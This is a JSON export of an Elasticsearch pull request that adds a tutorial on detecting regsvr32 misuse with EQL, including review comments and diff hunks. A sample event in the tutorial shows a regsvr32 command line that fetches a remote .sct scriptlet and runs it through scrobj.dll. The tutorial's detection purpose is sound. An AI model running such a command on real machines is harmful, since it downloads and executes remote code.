{"data": {"repository": {"pullRequest": {"id": "MDExOlB1bGxSZXF1ZXN0NDQ1MDE3MzM2", "number": 59105, "title": "[DOCS] EQL: Add threat detection example", "bodyText": "Adds a threat detection example tutorial based on the\nGetting started with EQL blog post.\nThe example can later be amended when/if support for the unique and\ncount pipes are added.\nI plan to map the sample dataset to ECS and update snippets accordingly as part of a follow-up PR. (Got this converted)\nPreview\nhttps://elasticsearch_59105.docs-preview.app.elstc.co/guide/en/elasticsearch/reference/master/eql-ex-threat-detection.html", "createdAt": "2020-07-06T21:42:47Z", "url": "https://github.com/elastic/elasticsearch/pull/59105", "merged": true, "mergeCommit": {"oid": "e8a907e34ae82985bcb3f62dad4d353a7b2e2e45"}, "closed": true, "closedAt": "2020-08-14T17:00:34Z", "author": {"login": "jrodewig"}, "timelineItems": {"totalCount": 38, "pageInfo": {"startCursor": "Y3Vyc29yOnYyOpPPAAABcyYSFNAH2gAyNDQ1MDE3MzM2OjQ0OTdhMjliYmFjODMwMDM2MThlNDBjOWU4NWI2N2MzNzUzZmM2ZjQ=", "endCursor": "Y3Vyc29yOnYyOpPPAAABc-238dAFqTQ2NzY5NTYwNg==", "hasNextPage": false, "hasPreviousPage": false}, "nodes": [{"__typename": "PullRequestCommit", "commit": {"oid": "4497a29bbac83003618e40c9e85b67c3753fc6f4", "author": {"user": {"login": "jrodewig", "name": "James Rodewig"}}, "url": "https://github.com/elastic/elasticsearch/commit/4497a29bbac83003618e40c9e85b67c3753fc6f4", "committedDate": "2020-07-06T21:39:46Z", "message": "[DOCS] EQL: Add threat detection example\n\nAdds a threat detection example tutorial based on the\n[`Getting started with EQL` blog post][0].\n\nThe example can later be amended when/if support for the `unique` and\n`count` pipes are added.\n\n[0]: https://www.elastic.co/blog/getting-started-eql"}}, {"__typename": "PullRequestCommit", "commit": {"oid": "2c1887790f2cb86230788702b88b9095cf586a3a", "author": {"user": {"login": "jrodewig", "name": "James Rodewig"}}, "url": "https://github.com/elastic/elasticsearch/commit/2c1887790f2cb86230788702b88b9095cf586a3a", "committedDate": "2020-07-07T14:12:17Z", "message": "iter"}}, {"__typename": "PullRequestCommit", "commit": {"oid": "96dd94437947a5b9c19b2c1fdcd06fc265301bdd", "author": {"user": {"login": "jrodewig", "name": "James Rodewig"}}, "url": "https://github.com/elastic/elasticsearch/commit/96dd94437947a5b9c19b2c1fdcd06fc265301bdd", "committedDate": "2020-07-07T14:36:19Z", "message": "reword"}}, {"__typename": "PullRequestCommit", "commit": {"oid": "c2bcc47e27bad204106a052715e10cbb8dded12d", "author": {"user": {"login": "jrodewig", "name": "James Rodewig"}}, "url": "https://github.com/elastic/elasticsearch/commit/c2bcc47e27bad204106a052715e10cbb8dded12d", "committedDate": "2020-07-07T14:39:08Z", "message": "correction"}}, {"__typename": "PullRequestCommit", "commit": {"oid": "f0542fdd61c54ff14ad08c0f57e80800133073bf", "author": {"user": {"login": "jrodewig", "name": "James Rodewig"}}, "url": "https://github.com/elastic/elasticsearch/commit/f0542fdd61c54ff14ad08c0f57e80800133073bf", "committedDate": "2020-07-07T15:04:32Z", "message": "update link to data"}}, {"__typename": "PullRequestCommit", "commit": {"oid": "4af3c373369eaf6070982c8ba2b1befd67428ddd", "author": {"user": {"login": "jrodewig", "name": "James Rodewig"}}, "url": "https://github.com/elastic/elasticsearch/commit/4af3c373369eaf6070982c8ba2b1befd67428ddd", "committedDate": "2020-07-07T15:58:20Z", "message": "add `by` to sequence query"}}, {"__typename": "PullRequestCommit", "commit": {"oid": "a4cfa3890d8fbdf2b975ec82c7120d5e584613c9", "author": {"user": {"login": "jrodewig", "name": "James Rodewig"}}, "url": "https://github.com/elastic/elasticsearch/commit/a4cfa3890d8fbdf2b975ec82c7120d5e584613c9", "committedDate": "2020-07-08T21:31:02Z", "message": "Convert to ECS"}}, {"__typename": "PullRequestCommit", "commit": {"oid": "89ba8d60fa7dd1fcf4944ba8f90b57e1574466bb", "author": {"user": {"login": "jrodewig", "name": "James Rodewig"}}, "url": "https://github.com/elastic/elasticsearch/commit/89ba8d60fa7dd1fcf4944ba8f90b57e1574466bb", "committedDate": "2020-07-08T21:54:39Z", "message": "Swap dev admon for experimental"}}, {"__typename": "PullRequestCommit", "commit": {"oid": "99145f59d6e6b6b6fdd238a3578a205627c25d73", "author": {"user": {"login": "jrodewig", "name": "James Rodewig"}}, "url": "https://github.com/elastic/elasticsearch/commit/99145f59d6e6b6b6fdd238a3578a205627c25d73", "committedDate": "2020-07-08T22:22:19Z", "message": "Fix out of spec schema"}}, {"__typename": "PullRequestReview", "id": "MDE3OlB1bGxSZXF1ZXN0UmV2aWV3NDQ5ODg1NjEz", "url": "https://github.com/elastic/elasticsearch/pull/59105#pullrequestreview-449885613", "createdAt": "2020-07-16T14:09:26Z", "commit": {"oid": "99145f59d6e6b6b6fdd238a3578a205627c25d73"}, "state": "COMMENTED", "comments": {"totalCount": 1, "pageInfo": {"startCursor": "Y3Vyc29yOnYyOpK0MjAyMC0wNy0xNlQxNDowOToyNlrOGyswVg==", "endCursor": "Y3Vyc29yOnYyOpK0MjAyMC0wNy0xNlQxNDowOToyNlrOGyswVg==", "hasNextPage": false, "hasPreviousPage": false}, "nodes": [{"id": "MDI0OlB1bGxSZXF1ZXN0UmV2aWV3Q29tbWVudDQ1NTgxNTI1NA==", "bodyText": "@costin does this always get turned into a string?", "url": "https://github.com/elastic/elasticsearch/pull/59105#discussion_r455815254", "createdAt": "2020-07-16T14:09:26Z", "author": {"login": "rw-access"}, "path": "docs/reference/eql/detect-threats-with-eql.asciidoc", "diffHunk": "@@ -0,0 +1,427 @@\n+[role=\"xpack\"]\n+[testenv=\"basic\"]\n+[[eql-ex-threat-detection]]\n+== Example: Detect threats with EQL\n+\n+experimental::[]\n+\n+This example tutorial shows you how you can use EQL to detect security threats\n+and other suspicious behavior.\n+\n+In the scenario, you're tasked with detecting\n+https://attack.mitre.org/techniques/T1117/[regsvr32 misuse] in Windows event\n+logs ingested using {winlogbeat-ref}/index.html[Winlogbeat]. Regsvr32 misuse is\n+a known adversary technique documented in the https://attack.mitre.org[MITRE\n+ATT&CK\u00ae] knowledge base.\n+\n+[discrete]\n+[[eql-ex-threat-detection-setup]]\n+=== Setup\n+\n+This tutorial uses a test dataset for regsvr32 misuse from\n+https://github.com/redcanaryco/atomic-red-team[Atomic Red Team]. The dataset has\n+been normalized and mapped to the {ecs-ref}[Elastic Common Schema (ECS)]. The\n+dataset includes events that imitate behaviors related to regsvr32 misuse, as\n+documented by MITRE ATT&CK\u00ae.\n+\n+To get started, download and index the dataset:\n+\n+. Download the https://raw.githubusercontent.com/elastic/elasticsearch/{branch}/docs/src/test/resources/normalized-T1117-AtomicRed-regsvr32.json[`normalized-T1117-AtomicRed-regsvr32.json`] dataset.\n+\n+. Index the data into the `sec_logs` index with the following\n+<<docs-bulk,bulk API>> request:\n+\n+[source,sh]\n+----\n+curl -H \"Content-Type: application/json\" -XPOST \"localhost:9200/sec_logs/_bulk?pretty&refresh\" --data-binary \"@normalized-T1117-AtomicRed-regsvr32.json\"\n+----\n+// NOTCONSOLE\n+\n+. Use the <<cat-indices,cat indices API>> to verify the dataset was indexed\n+successfully.\n+\n+[source,console]\n+----\n+GET /_cat/indices/sec_logs?v&h=health,status,index,docs.count\n+----\n+// TEST[setup:sec_logs]\n+\n+The API returns the following response. The `docs.count` value should show `150`\n+documents were indexed.\n+\n+[source,txt]\n+----\n+health status index     docs.count\n+yellow open   sec_logs         150\n+----\n+// TESTRESPONSE[non_json]\n+\n+[discrete]\n+[[eql-ex-get-a-count-of-regsvr32-events]]\n+=== Get a count of `regsvr32.exe` events\n+\n+Since you're looking for `regsvr32` misuse, start by getting a count of events\n+using `regsvr32.exe`.\n+\n+The following <<eql-search-api,EQL search API>> request uses an EQL query to\n+retrieve a count of events with a `process.name` of `regsvr32.exe`. The query\n+starts with the <<eql-syntax-match-any-event-category,`any where` keywords>>,\n+meaning the query can match events of any <<eql-required-fields,event\n+category>>.\n+\n+[source,console]\n+----\n+GET /sec_logs/_eql/search?filter_path=-hits.events  <1>\n+{\n+  \"query\": \"\"\"\n+    any where process.name == \"regsvr32.exe\"        <2>\n+  \"\"\",\n+  \"size\": 150                                       <3>\n+}\n+----\n+// TEST[setup:sec_logs]\n+\n+<1> Uses the `?filter_path=-hits.events` query parameter to exclude the\n+`hits.events` property from the response. The `hits.events` property contains\n+the document source for any matching events. This request is intended to\n+retrieve a count of events only.\n+<2> Uses an EQL query to match events with a `process.name` of `regsvr32.exe`.\n+<3> Returns up to 150 events or sequences matching the EQL query.\n+\n+The request returns the following response, indicating that 143 events match the\n+query.\n+\n+[source,console-result]\n+----\n+{\n+  \"is_partial\": false,\n+  \"is_running\": false,\n+  \"took\": 60,\n+  \"timed_out\": false,\n+  \"hits\": {\n+    \"total\": {\n+      \"value\": 143,\n+      \"relation\": \"eq\"\n+    }\n+  }\n+}\n+----\n+// TESTRESPONSE[s/\"took\": 60/\"took\": $body.took/]\n+\n+[discrete]\n+[[eql-ex-check-for-command-line-artifacts]]\n+=== Check for command line artifacts\n+\n+Your previous query matched 143 events. Many of these events are likely to be\n+false positives.\n+\n+To narrow down the results, check if the command line was used during any of\n+these events. Append `and process.command_line > 0` to the previous EQL query.\n+This limits matching results to events that contain a `process.command_line`\n+value.\n+\n+You'll also need to remove the `filter_path=-hits.events` query parameter. This\n+lets you retrieve the document source for any matching events.\n+\n+[source,console]\n+----\n+GET /sec_logs/_eql/search\n+{\n+  \"query\": \"\"\"\n+    any where process.name == \"regsvr32.exe\" and process.command_line > 0\n+  \"\"\",\n+  \"size\": 150\n+}\n+----\n+// TEST[setup:sec_logs]\n+\n+The query matches one event. Based on the event's `process.command_line` value,\n+`regsvr32.exe` was used to register a script as `scrobj.dll`. This fits known\n+regsvr32 misuse behavior.\n+\n+[source,console-result]\n+----\n+{\n+  \"is_partial\": false,\n+  \"is_running\": false,\n+  \"took\": 21,\n+  \"timed_out\": false,\n+  \"hits\": {\n+    \"total\": {\n+      \"value\": 1,\n+      \"relation\": \"eq\"\n+    },\n+    \"events\": [\n+      {\n+        \"_index\": \"sec_logs\",\n+        \"_id\": \"gl5MJXMBMk1dGnErnBW8\",\n+        \"_score\": null,\n+        \"_source\": {\n+          \"process\": {\n+            \"parent\": {\n+              \"name\": \"cmd.exe\",\n+              \"entity_id\": \"{42FC7E13-CBCB-5C05-0000-0010AA385401}\",\n+              \"executable\": \"C:\\\\Windows\\\\System32\\\\cmd.exe\"\n+            },\n+            \"name\": \"regsvr32.exe\",\n+            \"pid\": 2012,\n+            \"entity_id\": \"{42FC7E13-CBCB-5C05-0000-0010A0395401}\",\n+            \"command_line\": \"regsvr32.exe  /s /u /i:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1117/RegSvr32.sct scrobj.dll\",\n+            \"executable\": \"C:\\\\Windows\\\\System32\\\\regsvr32.exe\",\n+            \"ppid\": 2652\n+          },\n+          \"logon_id\": 217055,\n+          \"@timestamp\": 131883573237130000,\n+          \"event\": {\n+            \"category\": \"process\",\n+            \"type\": \"creation\"\n+          },\n+          \"user\": {\n+            \"full_name\": \"bob\",\n+            \"domain\": \"ART-DESKTOP\",\n+            \"id\": \"ART-DESKTOP\\\\bob\"\n+          }\n+        },\n+        \"sort\": [\n+          131883573237130000\n+        ]\n+      }\n+    ]\n+  }\n+}\n+----\n+// TESTRESPONSE[s/\"took\": 21/\"took\": $body.took/]\n+// TESTRESPONSE[s/\"_id\": \"gl5MJXMBMk1dGnErnBW8\"/\"_id\": $body.hits.events.0._id/]\n+\n+[discrete]\n+[[eql-ex-check-for-malicious-script-loads]]\n+=== Check for malicious script loads\n+\n+You now know that `regsvr32.exe` was used to register\n+a potentially malicious script as `scrob.dll`. Next, find any processes that\n+later load the `scrob.dll` file.\n+\n+Modify the previous EQL query as follows:\n+\n+* Change the `any` keyword to `file`. This means the query only matches\n+events with an `event.category` of `file`.\n+* Add the `file.name == \"scrobj.dll` condition to check for loads of\n+the `scrobj.dll` file.\n+\n+[source,console]\n+----\n+GET /sec_logs/_eql/search\n+{\n+  \"query\": \"\"\"\n+    file where process.name == \"regsvr32.exe\" and file.name == \"scrobj.dll\"\n+  \"\"\",\n+  \"size\": 150\n+}\n+----\n+// TEST[setup:sec_logs]\n+\n+The query matches an event, confirming that `scrobj.dll` was later loaded by\n+`regsvr32.exe`.\n+\n+[source,console-result]\n+----\n+{\n+  \"is_partial\": false,\n+  \"is_running\": false,\n+  \"took\": 5,\n+  \"timed_out\": false,\n+  \"hits\": {\n+    \"total\": {\n+      \"value\": 1,\n+      \"relation\": \"eq\"\n+    },\n+    \"events\": [\n+      {\n+        \"_index\": \"sec_logs\",\n+        \"_id\": \"ol5MJXMBMk1dGnErnBW8\",\n+        \"_score\": null,\n+        \"_source\": {\n+          \"process\": {\n+            \"name\": \"regsvr32.exe\",\n+            \"pid\": 2012,\n+            \"entity_id\": \"{42FC7E13-CBCB-5C05-0000-0010A0395401}\",\n+            \"executable\": \"C:\\\\Windows\\\\System32\\\\regsvr32.exe\"\n+          },\n+          \"file\": {\n+            \"path\": \"C:\\\\Windows\\\\System32\\\\scrobj.dll\",\n+            \"name\": \"scrobj.dll\"\n+          },\n+          \"@timestamp\": 131883573237450016,\n+          \"event\": {\n+            \"category\": \"file\"\n+          }\n+        },\n+        \"sort\": [\n+          131883573237450016\n+        ]\n+      }\n+    ]\n+  }\n+}\n+----\n+// TESTRESPONSE[s/\"took\": 5/\"took\": $body.took/]\n+// TESTRESPONSE[s/\"_id\": \"ol5MJXMBMk1dGnErnBW8\"/\"_id\": $body.hits.events.0._id/]\n+\n+[discrete]\n+[[eql-ex-detemine-likelihood-of-sucess]]\n+=== Determine likelihood of success\n+\n+In many cases, malicious scripts are used to download other remote files. If\n+this occurred, the attack progressed and might have succeeded.\n+\n+Use an <<eql-sequences,EQL sequence query>> to check for the following series of\n+events, in order:\n+\n+. A `regsvr32.exe` process, which could have been used to register malicious\n+scripts as `scrobj.dll`\n+. A load of the `scrobj.dll` file\n+. Any network event, which could indicate the download of a remote file\n+\n+To match, each event in the sequence must share the same `process.pid` (process\n+ID) field value.\n+\n+[source,console]\n+----\n+GET /sec_logs/_eql/search\n+{\n+  \"query\": \"\"\"\n+    sequence by process.pid\n+      [process where process.name == 'regsvr32.exe']\n+      [file where file.name == 'scrobj.dll']\n+      [network where true]\n+  \"\"\",\n+  \"size\": 150\n+}\n+----\n+// TEST[setup:sec_logs]\n+\n+The query matches a sequence, indicating the attack likely succeeded.\n+\n+[source,console-result]\n+----\n+{\n+  \"is_partial\": false,\n+  \"is_running\": false,\n+  \"took\": 25,\n+  \"timed_out\": false,\n+  \"hits\": {\n+    \"total\": {\n+      \"value\": 1,\n+      \"relation\": \"eq\"\n+    },\n+    \"sequences\": [\n+      {\n+        \"join_keys\": [\n+          \"2012\"", "state": "SUBMITTED", "replyTo": null, "originalCommit": {"oid": "99145f59d6e6b6b6fdd238a3578a205627c25d73"}, "originalPosition": 320}]}}, {"__typename": "PullRequestCommit", "commit": {"oid": "68c6796b78d63ef4f8e8c6412c5ebb149e5996d0", "author": {"user": {"login": "jrodewig", "name": "James Rodewig"}}, "url": "https://github.com/elastic/elasticsearch/commit/68c6796b78d63ef4f8e8c6412c5ebb149e5996d0", "committedDate": "2020-07-16T15:17:26Z", "message": "Merge remote-tracking branch 'upstream/master' into docs__eql-threat-detection"}}, {"__typename": "PullRequestCommit", "commit": {"oid": "fc672d2b12541dc8f2cf81cb596a252ebd51dbaa", "author": {"user": {"login": "jrodewig", "name": "James Rodewig"}}, "url": "https://github.com/elastic/elasticsearch/commit/fc672d2b12541dc8f2cf81cb596a252ebd51dbaa", "committedDate": "2020-07-16T15:35:35Z", "message": "Update response format for #59552"}}, {"__typename": "PullRequestCommit", "commit": {"oid": "4fcd7291f72efb1d319077e85cbf7365b11b7e1d", "author": {"user": {"login": "jrodewig", "name": "James Rodewig"}}, "url": "https://github.com/elastic/elasticsearch/commit/4fcd7291f72efb1d319077e85cbf7365b11b7e1d", "committedDate": "2020-07-16T16:59:32Z", "message": "Improve lang"}}, {"__typename": "PullRequestCommit", "commit": {"oid": "6bfd73de2ededd6028d58b392850186d21d99725", "author": {"user": {"login": "jrodewig", "name": "James Rodewig"}}, "url": "https://github.com/elastic/elasticsearch/commit/6bfd73de2ededd6028d58b392850186d21d99725", "committedDate": "2020-07-22T18:26:58Z", "message": "fix ord list formatting"}}, {"__typename": "PullRequestCommit", "commit": {"oid": "08861b016c455b51a44ba23ef987fb5374641254", "author": {"user": {"login": "jrodewig", "name": "James Rodewig"}}, "url": "https://github.com/elastic/elasticsearch/commit/08861b016c455b51a44ba23ef987fb5374641254", "committedDate": "2020-08-05T18:04:35Z", "message": "Merge remote-tracking branch 'upstream/master' into docs__eql-threat-detection"}}, {"__typename": "PullRequestCommit", "commit": {"oid": "b08e698f33bb3dde6b5789d62943dce19d7ae00f", "author": {"user": {"login": "jrodewig", "name": "James Rodewig"}}, "url": "https://github.com/elastic/elasticsearch/commit/b08e698f33bb3dde6b5789d62943dce19d7ae00f", "committedDate": "2020-08-05T18:42:03Z", "message": "fix naming collision"}}, {"__typename": "PullRequestCommit", "commit": {"oid": "5cc367237a8c1eb83e1ab165612a4277fb17f5ea", "author": {"user": {"login": "jrodewig", "name": "James Rodewig"}}, "url": "https://github.com/elastic/elasticsearch/commit/5cc367237a8c1eb83e1ab165612a4277fb17f5ea", "committedDate": "2020-08-05T19:04:21Z", "message": "fix include"}}, {"__typename": "PullRequestCommit", "commit": {"oid": "f31c960703c14de408a11b972445c80b1309683d", "author": {"user": {"login": "jrodewig", "name": "James Rodewig"}}, "url": "https://github.com/elastic/elasticsearch/commit/f31c960703c14de408a11b972445c80b1309683d", "committedDate": "2020-08-05T19:14:49Z", "message": "fix cat response alignment"}}, {"__typename": "PullRequestReview", "id": "MDE3OlB1bGxSZXF1ZXN0UmV2aWV3NDY3NTYyOTQz", "url": "https://github.com/elastic/elasticsearch/pull/59105#pullrequestreview-467562943", "createdAt": "2020-08-14T13:12:41Z", "commit": {"oid": "f31c960703c14de408a11b972445c80b1309683d"}, "state": "COMMENTED", "comments": {"totalCount": 1, "pageInfo": {"startCursor": "Y3Vyc29yOnYyOpK0MjAyMC0wOC0xNFQxMzoxMjo0MlrOHA0Dqw==", "endCursor": "Y3Vyc29yOnYyOpK0MjAyMC0wOC0xNFQxMzoxMjo0MlrOHA0Dqw==", "hasNextPage": false, "hasPreviousPage": false}, "nodes": [{"id": "MDI0OlB1bGxSZXF1ZXN0UmV2aWV3Q29tbWVudDQ3MDYxNDk1NQ==", "bodyText": "The ATT&CK taxonomy has slightly changed since this original PR, so this is the new link. They left in redirects though, so the old one still works, but this is where it redirects to.\n\n  \n    \n      \n        Suggested change\n        \n          \n    \n\n        \n      \n    \n    \n      \n          \n            \n            https://attack.mitre.org/techniques/T1117/[regsvr32 misuse] in Windows event\n          \n          \n            \n            https://attack.mitre.org/techniques/T1218/010/[regsvr32 misuse] in Windows event", "url": "https://github.com/elastic/elasticsearch/pull/59105#discussion_r470614955", "createdAt": "2020-08-14T13:12:42Z", "author": {"login": "rw-access"}, "path": "docs/reference/eql/detect-threats-with-eql.asciidoc", "diffHunk": "@@ -0,0 +1,424 @@\n+[role=\"xpack\"]\n+[testenv=\"basic\"]\n+[[eql-ex-threat-detection]]\n+== Example: Detect threats with EQL\n+\n+experimental::[]\n+\n+This example tutorial shows you how you can use EQL to detect security threats\n+and other suspicious behavior.\n+\n+In the scenario, you're tasked with detecting\n+https://attack.mitre.org/techniques/T1117/[regsvr32 misuse] in Windows event", "state": "SUBMITTED", "replyTo": null, "originalCommit": {"oid": "f31c960703c14de408a11b972445c80b1309683d"}, "originalPosition": 12}]}}, {"__typename": "PullRequestReview", "id": "MDE3OlB1bGxSZXF1ZXN0UmV2aWV3NDY3NTY0NDkx", "url": "https://github.com/elastic/elasticsearch/pull/59105#pullrequestreview-467564491", "createdAt": "2020-08-14T13:14:50Z", "commit": {"oid": "f31c960703c14de408a11b972445c80b1309683d"}, "state": "COMMENTED", "comments": {"totalCount": 1, "pageInfo": {"startCursor": "Y3Vyc29yOnYyOpK0MjAyMC0wOC0xNFQxMzoxNDo1MFrOHA0INA==", "endCursor": "Y3Vyc29yOnYyOpK0MjAyMC0wOC0xNFQxMzoxNDo1MFrOHA0INA==", "hasNextPage": false, "hasPreviousPage": false}, "nodes": [{"id": "MDI0OlB1bGxSZXF1ZXN0UmV2aWV3Q29tbWVudDQ3MDYxNjExNg==", "bodyText": "Should this number be increased, since we already know there are 150?", "url": "https://github.com/elastic/elasticsearch/pull/59105#discussion_r470616116", "createdAt": "2020-08-14T13:14:50Z", "author": {"login": "rw-access"}, "path": "docs/reference/eql/detect-threats-with-eql.asciidoc", "diffHunk": "@@ -0,0 +1,424 @@\n+[role=\"xpack\"]\n+[testenv=\"basic\"]\n+[[eql-ex-threat-detection]]\n+== Example: Detect threats with EQL\n+\n+experimental::[]\n+\n+This example tutorial shows you how you can use EQL to detect security threats\n+and other suspicious behavior.\n+\n+In the scenario, you're tasked with detecting\n+https://attack.mitre.org/techniques/T1117/[regsvr32 misuse] in Windows event\n+logs ingested using {winlogbeat-ref}/index.html[Winlogbeat]. Regsvr32 misuse is\n+a known adversary technique documented in the https://attack.mitre.org[MITRE\n+ATT&CK\u00ae] knowledge base.\n+\n+[discrete]\n+[[eql-ex-threat-detection-setup]]\n+=== Setup\n+\n+This tutorial uses a test dataset for regsvr32 misuse from\n+https://github.com/redcanaryco/atomic-red-team[Atomic Red Team]. The dataset has\n+been normalized and mapped to the {ecs-ref}[Elastic Common Schema (ECS)]. The\n+dataset includes events that imitate behaviors related to regsvr32 misuse, as\n+documented by MITRE ATT&CK\u00ae.\n+\n+To get started, download and index the dataset:\n+\n+. Download the https://raw.githubusercontent.com/elastic/elasticsearch/{branch}/docs/src/test/resources/normalized-T1117-AtomicRed-regsvr32.json[`normalized-T1117-AtomicRed-regsvr32.json`] dataset.\n+\n+. Index the data into the `my-index-000001` index with the following\n+<<docs-bulk,bulk API>> request:\n++\n+[source,sh]\n+----\n+curl -H \"Content-Type: application/json\" -XPOST \"localhost:9200/my-index-000001/_bulk?pretty&refresh\" --data-binary \"@normalized-T1117-AtomicRed-regsvr32.json\"\n+----\n+// NOTCONSOLE\n+\n+. Use the <<cat-indices,cat indices API>> to verify the dataset was indexed\n+successfully.\n++\n+[source,console]\n+----\n+GET /_cat/indices/my-index-000001?v&h=health,status,index,docs.count\n+----\n+// TEST[setup:atomic_red_regsvr32]\n++\n+The API returns the following response. The `docs.count` value should show `150`\n+documents were indexed.\n++\n+[source,txt]\n+----\n+health status index            docs.count\n+yellow open   my-index-000001         150\n+----\n+// TESTRESPONSE[non_json]\n+\n+[discrete]\n+[[eql-ex-get-a-count-of-regsvr32-events]]\n+=== Get a count of `regsvr32.exe` events\n+\n+Since you're looking for `regsvr32` misuse, start by getting a count of events\n+using `regsvr32.exe`.\n+\n+The following <<eql-search-api,EQL search API>> request uses an EQL query to\n+retrieve a count of events with a `process.name` of `regsvr32.exe`. The query\n+starts with the <<eql-syntax-match-any-event-category,`any where` keywords>>,\n+meaning the query can match events of any <<eql-required-fields,event\n+category>>.\n+\n+[source,console]\n+----\n+GET /my-index-000001/_eql/search?filter_path=-hits.events  <1>\n+{\n+  \"query\": \"\"\"\n+    any where process.name == \"regsvr32.exe\"        <2>\n+  \"\"\",\n+  \"size\": 150                                       <3>", "state": "SUBMITTED", "replyTo": null, "originalCommit": {"oid": "f31c960703c14de408a11b972445c80b1309683d"}, "originalPosition": 79}]}}, {"__typename": "PullRequestReview", "id": "MDE3OlB1bGxSZXF1ZXN0UmV2aWV3NDY3NTY1NDg1", "url": "https://github.com/elastic/elasticsearch/pull/59105#pullrequestreview-467565485", "createdAt": "2020-08-14T13:16:18Z", "commit": {"oid": "f31c960703c14de408a11b972445c80b1309683d"}, "state": "COMMENTED", "comments": {"totalCount": 1, "pageInfo": {"startCursor": "Y3Vyc29yOnYyOpK0MjAyMC0wOC0xNFQxMzoxNjoxOVrOHA0LGw==", "endCursor": "Y3Vyc29yOnYyOpK0MjAyMC0wOC0xNFQxMzoxNjoxOVrOHA0LGw==", "hasNextPage": false, "hasPreviousPage": false}, "nodes": [{"id": "MDI0OlB1bGxSZXF1ZXN0UmV2aWV3Q29tbWVudDQ3MDYxNjg1OQ==", "bodyText": "Alternatively, we could do process where ... right?\n\n  \n    \n      \n        Suggested change\n        \n          \n    \n\n        \n      \n    \n    \n      \n          \n            \n                any where process.name == \"regsvr32.exe\" and process.command_line > 0\n          \n          \n            \n                any where process.name == \"regsvr32.exe\" and process.command_line != null", "url": "https://github.com/elastic/elasticsearch/pull/59105#discussion_r470616859", "createdAt": "2020-08-14T13:16:19Z", "author": {"login": "rw-access"}, "path": "docs/reference/eql/detect-threats-with-eql.asciidoc", "diffHunk": "@@ -0,0 +1,424 @@\n+[role=\"xpack\"]\n+[testenv=\"basic\"]\n+[[eql-ex-threat-detection]]\n+== Example: Detect threats with EQL\n+\n+experimental::[]\n+\n+This example tutorial shows you how you can use EQL to detect security threats\n+and other suspicious behavior.\n+\n+In the scenario, you're tasked with detecting\n+https://attack.mitre.org/techniques/T1117/[regsvr32 misuse] in Windows event\n+logs ingested using {winlogbeat-ref}/index.html[Winlogbeat]. Regsvr32 misuse is\n+a known adversary technique documented in the https://attack.mitre.org[MITRE\n+ATT&CK\u00ae] knowledge base.\n+\n+[discrete]\n+[[eql-ex-threat-detection-setup]]\n+=== Setup\n+\n+This tutorial uses a test dataset for regsvr32 misuse from\n+https://github.com/redcanaryco/atomic-red-team[Atomic Red Team]. The dataset has\n+been normalized and mapped to the {ecs-ref}[Elastic Common Schema (ECS)]. The\n+dataset includes events that imitate behaviors related to regsvr32 misuse, as\n+documented by MITRE ATT&CK\u00ae.\n+\n+To get started, download and index the dataset:\n+\n+. Download the https://raw.githubusercontent.com/elastic/elasticsearch/{branch}/docs/src/test/resources/normalized-T1117-AtomicRed-regsvr32.json[`normalized-T1117-AtomicRed-regsvr32.json`] dataset.\n+\n+. Index the data into the `my-index-000001` index with the following\n+<<docs-bulk,bulk API>> request:\n++\n+[source,sh]\n+----\n+curl -H \"Content-Type: application/json\" -XPOST \"localhost:9200/my-index-000001/_bulk?pretty&refresh\" --data-binary \"@normalized-T1117-AtomicRed-regsvr32.json\"\n+----\n+// NOTCONSOLE\n+\n+. Use the <<cat-indices,cat indices API>> to verify the dataset was indexed\n+successfully.\n++\n+[source,console]\n+----\n+GET /_cat/indices/my-index-000001?v&h=health,status,index,docs.count\n+----\n+// TEST[setup:atomic_red_regsvr32]\n++\n+The API returns the following response. The `docs.count` value should show `150`\n+documents were indexed.\n++\n+[source,txt]\n+----\n+health status index            docs.count\n+yellow open   my-index-000001         150\n+----\n+// TESTRESPONSE[non_json]\n+\n+[discrete]\n+[[eql-ex-get-a-count-of-regsvr32-events]]\n+=== Get a count of `regsvr32.exe` events\n+\n+Since you're looking for `regsvr32` misuse, start by getting a count of events\n+using `regsvr32.exe`.\n+\n+The following <<eql-search-api,EQL search API>> request uses an EQL query to\n+retrieve a count of events with a `process.name` of `regsvr32.exe`. The query\n+starts with the <<eql-syntax-match-any-event-category,`any where` keywords>>,\n+meaning the query can match events of any <<eql-required-fields,event\n+category>>.\n+\n+[source,console]\n+----\n+GET /my-index-000001/_eql/search?filter_path=-hits.events  <1>\n+{\n+  \"query\": \"\"\"\n+    any where process.name == \"regsvr32.exe\"        <2>\n+  \"\"\",\n+  \"size\": 150                                       <3>\n+}\n+----\n+// TEST[setup:atomic_red_regsvr32]\n+\n+<1> Uses the `?filter_path=-hits.events` query parameter to exclude the\n+`hits.events` property from the response. The `hits.events` property contains\n+the document source for any matching events. This request is intended to\n+retrieve a count of events only.\n+<2> Uses an EQL query to match events with a `process.name` of `regsvr32.exe`.\n+<3> Returns up to 150 events or sequences matching the EQL query.\n+\n+The request returns the following response, indicating that 143 events match the\n+query.\n+\n+[source,console-result]\n+----\n+{\n+  \"is_partial\": false,\n+  \"is_running\": false,\n+  \"took\": 60,\n+  \"timed_out\": false,\n+  \"hits\": {\n+    \"total\": {\n+      \"value\": 143,\n+      \"relation\": \"eq\"\n+    }\n+  }\n+}\n+----\n+// TESTRESPONSE[s/\"took\": 60/\"took\": $body.took/]\n+\n+[discrete]\n+[[eql-ex-check-for-command-line-artifacts]]\n+=== Check for command line artifacts\n+\n+Your previous query matched 143 events. Many of these events are likely to be\n+false positives.\n+\n+To narrow down the results, check if the command line was used during any of\n+these events. Append `and process.command_line > 0` to the previous EQL query.\n+This limits matching results to events that contain a `process.command_line`\n+value.\n+\n+You'll also need to remove the `filter_path=-hits.events` query parameter. This\n+lets you retrieve the document source for any matching events.\n+\n+[source,console]\n+----\n+GET /my-index-000001/_eql/search\n+{\n+  \"query\": \"\"\"\n+    any where process.name == \"regsvr32.exe\" and process.command_line > 0", "state": "SUBMITTED", "replyTo": null, "originalCommit": {"oid": "f31c960703c14de408a11b972445c80b1309683d"}, "originalPosition": 131}]}}, {"__typename": "PullRequestReview", "id": "MDE3OlB1bGxSZXF1ZXN0UmV2aWV3NDY3NTY2Mjg1", "url": "https://github.com/elastic/elasticsearch/pull/59105#pullrequestreview-467566285", "createdAt": "2020-08-14T13:17:32Z", "commit": {"oid": "f31c960703c14de408a11b972445c80b1309683d"}, "state": "COMMENTED", "comments": {"totalCount": 1, "pageInfo": {"startCursor": "Y3Vyc29yOnYyOpK0MjAyMC0wOC0xNFQxMzoxNzozMlrOHA0Nsg==", "endCursor": 